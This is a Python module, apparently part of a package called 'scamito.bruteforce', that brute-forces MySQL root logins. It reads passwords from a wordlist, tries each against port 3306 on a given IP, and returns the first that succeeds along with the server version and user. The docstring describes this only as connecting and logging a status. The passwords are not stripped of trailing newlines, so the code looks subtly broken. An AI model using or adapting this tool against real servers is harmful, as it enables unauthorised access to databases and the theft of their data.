"""Connect to the remote MySQL database and log a short status."""

import logging

import pymysql

from scamito.bruteforce.abstract_db_conn import AbstractDBConn

log =  logging.getLogger(__name__)


class MySqlConnector(AbstractDBConn):
    @staticmethod
    def connect(ip: str) -> str | None:
        with open("data/password.lst", 'r') as f:
            for password in f:
                try:
                    with pymysql.connect(
                            host=ip,
                            port=3306,
                            database="mysql",
                            user="root",
                            password=password,
                            connect_timeout=10,
                    ) as conn:
                        with conn.cursor() as cur:
                            cur.execute("SELECT VERSION(), DATABASE(), USER();")
                            version, database, user = cur.fetchone()
                    log.info(
                        "Connected",
                        extra={"database": database, "user": user, "version": version},
                    )
                    return password
                except (pymysql.err.OperationalError, RuntimeError) as e:
                    msg = str(e)
                    log.warning("%s: %s", password, msg)
                    if "Can't connect to MySQL server on" in msg or "connection timeout expired" == msg or "'cryptography' package is required" in msg:
                        return None
            return None